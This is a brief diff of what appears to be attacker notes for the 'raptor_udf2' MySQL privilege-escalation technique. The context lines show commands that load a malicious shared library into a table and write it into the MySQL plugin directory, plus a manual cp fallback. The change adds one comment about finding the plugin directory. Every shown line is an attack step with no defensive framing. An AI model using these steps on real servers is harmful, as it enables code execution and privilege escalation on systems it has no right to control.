@@ -9,6 +9,7 @@ mysql> create table foo(line blob);
 mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
 mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 
+#show variables to see the file dir
 
 #if there is an error, copy file manually (cp /tmp/raptor_udf2.so /usr/lib/mysql/plugin/raptor_udf2.so && cp /tmp/raptor_udf2.so /usr/lib/raptor_udf2.so)
 
